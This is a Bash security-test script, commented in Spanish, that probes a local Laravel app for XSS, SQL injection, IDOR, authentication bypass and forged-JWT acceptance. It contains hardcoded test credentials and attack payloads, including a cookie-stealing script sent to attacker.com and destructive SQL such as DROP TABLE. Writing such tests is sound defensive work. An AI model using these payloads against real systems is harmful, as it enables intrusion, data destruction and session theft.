#!/bin/bash

# Script de pruebas de seguridad para Laravel
# Fecha: 21/04/2025
# Descripción: Realiza pruebas de seguridad automatizadas en una aplicación Laravel

# Configuración
HOST="http://localhost:8000"
COOKIE_JAR="cookies.txt"
OUTPUT_DIR="security_results"
LOG_FILE="$OUTPUT_DIR/security_tests.log"

# Credenciales
declare -A CREDENTIALS=(
    ["superadmin"]="denesik.cassandre:admin12345"
    ["registrador"]="registrador:Registrador123"
    ["auditor"]="auditor:Auditor123*"
)

# Colores para la salida
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Crear directorio para resultados si no existe
mkdir -p "$OUTPUT_DIR"
> "$LOG_FILE" # Crear o limpiar archivo de log

# Función para registrar resultados
log() {
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# Función para mostrar el resultado de una prueba
show_result() {
    TEST_NAME="$1"
    SUCCESS="$2"
    MESSAGE="$3"
    
    if [ "$SUCCESS" = true ]; then
        echo -e "${GREEN}[✓] $TEST_NAME: $MESSAGE${NC}"
    else
        echo -e "${RED}[✗] $TEST_NAME: $MESSAGE${NC}"
    fi
    log "$TEST_NAME: $MESSAGE"
}

# Función para obtener token CSRF
get_csrf_token() {
    RESPONSE=$(curl -s -c "$COOKIE_JAR" "$HOST/login")
    TOKEN=$(grep -A 10 'csrf-token' <<< "$RESPONSE" | grep -o 'content="[^"]*"' | cut -d'"' -f2)
    
    if [ -z "$TOKEN" ]; then
        # Intentar extraer de la cookie si no está en el HTML
        TOKEN=$(grep XSRF-TOKEN "$COOKIE_JAR" 2>/dev/null | cut -f7)
        # Decodificar el token URL-encoded
        TOKEN=$(echo "$TOKEN" | sed 's/%/\\x/g' | xargs -0 echo -e)
    fi
    
    echo "$TOKEN"
}

# Función para iniciar sesión
login() {
    USER="$1"
    PASS="$2"
    
    log "Iniciando sesión con usuario: $USER"
    
    # Obtener token CSRF
    TOKEN=$(get_csrf_token)
    
    if [ -z "$TOKEN" ]; then
        show_result "Login - Obtener CSRF" false "No se pudo obtener el token CSRF"
        return 1
    fi
    
    show_result "Login - Obtener CSRF" true "Token CSRF obtenido: ${TOKEN:0:10}..."
    
    # Enviar solicitud de inicio de sesión
    RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "$HOST/login" \
        -H "X-XSRF-TOKEN: $TOKEN" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Accept: application/json" \
        --data-urlencode "username=$USER" \
        --data-urlencode "password=$PASS" \
        -i)
    
    # Verificar respuesta
    if echo "$RESPONSE" | grep -q "302 Found\|200 OK"; then
        show_result "Login - Autenticación" true "Sesión iniciada correctamente"
        
        # Obtener el nuevo token CSRF después del login
        NEW_TOKEN=$(grep XSRF-TOKEN "$COOKIE_JAR" | cut -f7)
        # Decodificar el token URL-encoded
        NEW_TOKEN=$(echo "$NEW_TOKEN" | sed 's/%/\\x/g' | xargs -0 echo -e)
        
        if [ -n "$NEW_TOKEN" ]; then
            show_result "Login - Nuevo token CSRF" true "Nuevo token obtenido: ${NEW_TOKEN:0:10}..."
            echo "$NEW_TOKEN"
            return 0
        else
            show_result "Login - Nuevo token CSRF" false "No se pudo obtener el nuevo token CSRF"
            return 1
        fi
    else
        show_result "Login - Autenticación" false "Falló el inicio de sesión"
        return 1
    fi
}

# Función para probar vulnerabilidad XSS
test_xss() {
    TOKEN="$1"
    ENDPOINT="$2"
    METHOD="$3"
    PAYLOAD="$4"
    TEST_NAME="$5"
    
    log "Probando XSS en $ENDPOINT"
    
    # Construir la solicitud según el método
    if [ "$METHOD" = "POST" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            --data "$PAYLOAD")
    elif [ "$METHOD" = "PUT" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X PUT "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            --data "$PAYLOAD")
    fi
    
    # Verificar respuesta
    if echo "$RESPONSE" | grep -q "<script>\|onerror=\|iframe"; then
        show_result "$TEST_NAME" false "Vulnerabilidad XSS detectada: $RESPONSE"
    else
        show_result "$TEST_NAME" true "No se detectaron vulnerabilidades XSS"
    fi
}

# Función para probar inyección SQL
test_sql_injection() {
    TOKEN="$1"
    ENDPOINT="$2"
    METHOD="$3"
    PAYLOAD="$4"
    TEST_NAME="$5"
    
    log "Probando SQL Injection en $ENDPOINT"
    
    # Construir la solicitud según el método
    if [ "$METHOD" = "POST" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            --data "$PAYLOAD")
    elif [ "$METHOD" = "PUT" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X PUT "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            --data "$PAYLOAD")
    fi
    
    # Verificar respuesta
    if echo "$RESPONSE" | grep -q "error\|exception\|syntax\|mysql\|PostgreSQL\|Microsoft SQL"; then
        show_result "$TEST_NAME" false "Posible vulnerabilidad de inyección SQL detectada: $RESPONSE"
    else
        show_result "$TEST_NAME" true "No se detectaron vulnerabilidades de inyección SQL"
    fi
}

# Función para probar IDOR
test_idor() {
    TOKEN="$1"
    ENDPOINT="$2"
    METHOD="$3"
    PAYLOAD="$4"
    TEST_NAME="$5"
    
    log "Probando IDOR en $ENDPOINT"
    
    # Construir la solicitud según el método
    if [ "$METHOD" = "GET" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X GET "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Accept: application/json")
    elif [ "$METHOD" = "PUT" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X PUT "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            --data "$PAYLOAD")
    elif [ "$METHOD" = "DELETE" ]; then
        RESPONSE=$(curl -s -b "$COOKIE_JAR" -X DELETE "$HOST$ENDPOINT" \
            -H "X-XSRF-TOKEN: $TOKEN" \
            -H "Accept: application/json")
    fi
    
    # Verificar respuesta
    if echo "$RESPONSE" | grep -q "200 OK\|201 Created\|204 No Content"; then
        show_result "$TEST_NAME" false "Vulnerabilidad IDOR detectada: Se permitió el acceso no autorizado"
    else
        show_result "$TEST_NAME" true "No se detectaron vulnerabilidades IDOR"
    fi
}

# Función para probar bypass de autenticación
test_auth_bypass() {
    ENDPOINT="$1"
    METHOD="$2"
    AUTH_HEADER="$3"
    TEST_NAME="$4"
    
    log "Probando bypass de autenticación en $ENDPOINT"
    
    # Construir la solicitud según el método
    if [ "$METHOD" = "GET" ]; then
        if [ -n "$AUTH_HEADER" ]; then
            RESPONSE=$(curl -s -X GET "$HOST$ENDPOINT" \
                -H "$AUTH_HEADER" \
                -H "Accept: application/json")
        else
            RESPONSE=$(curl -s -X GET "$HOST$ENDPOINT" \
                -H "Accept: application/json")
        fi
    fi
    
    # Verificar respuesta
    if echo "$RESPONSE" | grep -q "200 OK\|dashboard\|success"; then
        show_result "$TEST_NAME" false "Bypass de autenticación detectado: Se permitió el acceso no autorizado"
    else
        show_result "$TEST_NAME" true "No se detectaron vulnerabilidades de bypass de autenticación"
    fi
}

# INICIO DE PRUEBAS
echo -e "${BLUE}===== INICIANDO PRUEBAS DE SEGURIDAD EN LARAVEL =====${NC}"
echo -e "${BLUE}Fecha: $(date)${NC}"
echo -e "${BLUE}Host: $HOST${NC}"
echo -e "${BLUE}=================================================${NC}\n"

# Limpiar cookie jar antes de empezar
> "$COOKIE_JAR"

# ===== PRUEBAS CON SUPERADMIN =====
echo -e "\n${YELLOW}===== PRUEBAS CON USUARIO SUPERADMIN =====${NC}"
IFS=':' read -r SUPERADMIN_USER SUPERADMIN_PASS <<< "${CREDENTIALS["superadmin"]}"
SUPERADMIN_TOKEN=$(login "$SUPERADMIN_USER" "$SUPERADMIN_PASS")

if [ -n "$SUPERADMIN_TOKEN" ]; then
    # Pruebas XSS
    echo -e "\n${YELLOW}-> Pruebas XSS${NC}"
    test_xss "$SUPERADMIN_TOKEN" "/users" "POST" "username=<script>alert('XSS')</script>&password=Password123!&password_confirmation=Password123!&role_id=2" "XSS - Creación usuario"
    test_xss "$SUPERADMIN_TOKEN" "/products" "POST" "code=PROD-XSS&name=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>&description=Producto normal&quantity=5&price=49.95" "XSS - Creación producto"
    test_xss "$SUPERADMIN_TOKEN" "/roles" "POST" "name=<iframe src=javascript:alert('xss')></iframe>&slug=xss-role" "XSS - Creación rol"
    
    # Pruebas SQL Injection
    echo -e "\n${YELLOW}-> Pruebas SQL Injection${NC}"
    test_sql_injection "$SUPERADMIN_TOKEN" "/users" "POST" "username=user'; DROP TABLE users; --&password=Password123!&password_confirmation=Password123!&role_id=2" "SQLi - Creación usuario"
    test_sql_injection "$SUPERADMIN_TOKEN" "/products" "POST" "code=PROD'; UPDATE products SET price=0; --&name=Producto&description=Descripción&quantity=15&price=129.99" "SQLi - Creación producto"
    test_sql_injection "$SUPERADMIN_TOKEN" "/roles" "POST" "name=Role'; INSERT INTO roles (name, slug) VALUES ('Hacked', 'hacked'); --&slug=hack-role" "SQLi - Creación rol"
fi

# ===== PRUEBAS CON REGISTRADOR =====
echo -e "\n${YELLOW}===== PRUEBAS CON USUARIO REGISTRADOR =====${NC}"
> "$COOKIE_JAR" # Limpiar cookie jar
IFS=':' read -r REGISTRADOR_USER REGISTRADOR_PASS <<< "${CREDENTIALS["registrador"]}"
REGISTRADOR_TOKEN=$(login "$REGISTRADOR_USER" "$REGISTRADOR_PASS")

if [ -n "$REGISTRADOR_TOKEN" ]; then
    # Pruebas IDOR
    echo -e "\n${YELLOW}-> Pruebas IDOR${NC}"
    test_idor "$REGISTRADOR_TOKEN" "/users/1/edit" "GET" "" "IDOR - Acceso a usuario SuperAdmin"
    test_idor "$REGISTRADOR_TOKEN" "/users/1" "DELETE" "" "IDOR - Eliminar usuario SuperAdmin"
    
    # Pruebas de permisos
    echo -e "\n${YELLOW}-> Pruebas de permisos${NC}"
    test_idor "$REGISTRADOR_TOKEN" "/roles/1/permissions" "GET" "" "IDOR - Acceso a permisos de rol"
    test_idor "$REGISTRADOR_TOKEN" "/roles/1" "PUT" "name=RolModificado&slug=modified" "IDOR - Modificar rol"
    
    # Pruebas de bypass de autenticación
    echo -e "\n${YELLOW}-> Pruebas de bypass de autenticación${NC}"
    test_auth_bypass "/dashboard" "GET" "Authorization: Bearer $REGISTRADOR_TOKEN" "Bypass - Acceso a dashboard"
fi

# ===== PRUEBAS CON AUDITOR =====
echo -e "\n${YELLOW}===== PRUEBAS CON USUARIO AUDITOR =====${NC}"
> "$COOKIE_JAR" # Limpiar cookie jar
IFS=':' read -r AUDITOR_USER AUDITOR_PASS <<< "${CREDENTIALS["auditor"]}"
AUDITOR_TOKEN=$(login "$AUDITOR_USER" "$AUDITOR_PASS")

if [ -n "$AUDITOR_TOKEN" ]; then
    # Pruebas con productos
    echo -e "\n${YELLOW}-> Pruebas con productos${NC}"
    test_idor "$AUDITOR_TOKEN" "/products/create" "GET" "" "IDOR - Acceso a creación de productos"
    test_idor "$AUDITOR_TOKEN" "/products" "POST" "code=PROD-TEST&name=Producto Test&description=Descripción&quantity=10&price=99.99" "IDOR - Crear producto sin permiso"
    test_idor "$AUDITOR_TOKEN" "/products/1" "PUT" "code=PROD-001&name=Producto Hackeado&description=Modificado&quantity=0&price=0.01" "IDOR - Modificar producto sin permiso"
    test_idor "$AUDITOR_TOKEN" "/products/1" "DELETE" "" "IDOR - Eliminar producto sin permiso"
fi

# ===== PRUEBAS SIN AUTENTICACIÓN =====
echo -e "\n${YELLOW}===== PRUEBAS SIN AUTENTICACIÓN =====${NC}"
> "$COOKIE_JAR" # Limpiar cookie jar

# Pruebas de bypass de autenticación
echo -e "\n${YELLOW}-> Pruebas de bypass de autenticación${NC}"
test_auth_bypass "/users" "GET" "" "Bypass - Acceso a listado de usuarios sin autenticación"
test_auth_bypass "/dashboard" "GET" "" "Bypass - Acceso a dashboard sin autenticación"
test_auth_bypass "/products" "GET" "" "Bypass - Acceso a productos sin autenticación"

# Pruebas de inyección SQL en login
echo -e "\n${YELLOW}-> Pruebas de inyección SQL en login${NC}"
TOKEN=$(get_csrf_token)
RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "$HOST/login" \
    -H "X-XSRF-TOKEN: $TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    --data-urlencode "username=admin' OR '1'='1" \
    --data-urlencode "password=' OR '1'='1" \
    -i)

if echo "$RESPONSE" | grep -q "302 Found\|200 OK\|dashboard"; then
    show_result "SQLi - Login bypass" false "Vulnerabilidad detectada: Se permitió el acceso con inyección SQL"
else
    show_result "SQLi - Login bypass" true "No se detectaron vulnerabilidades de inyección SQL en login"
fi

# Pruebas de token JWT manipulado
echo -e "\n${YELLOW}-> Pruebas de token JWT manipulado${NC}"
FAKE_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6IlN1cGVyQWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.fake_signature"
RESPONSE=$(curl -s -X GET "$HOST/test-auth" \
    -H "Authorization: Bearer $FAKE_TOKEN" \
    -H "Accept: application/json")

if echo "$RESPONSE" | grep -q "200 OK\|Autorizado correctamente"; then
    show_result "JWT - Token manipulado" false "Vulnerabilidad detectada: Se aceptó un token JWT manipulado"
else
    show_result "JWT - Token manipulado" true "No se aceptó el token JWT manipulado"
fi

# Resumen final
echo -e "\n${BLUE}===== RESUMEN DE PRUEBAS DE SEGURIDAD =====${NC}"
echo -e "${BLUE}Las pruebas han finalizado. Consulta el archivo de registro para detalles:${NC}"
echo -e "${BLUE}$LOG_FILE${NC}"
echo -e "${BLUE}=================================================${NC}\n"

# Limpiar archivos temporales
rm -f "$COOKIE_JAR"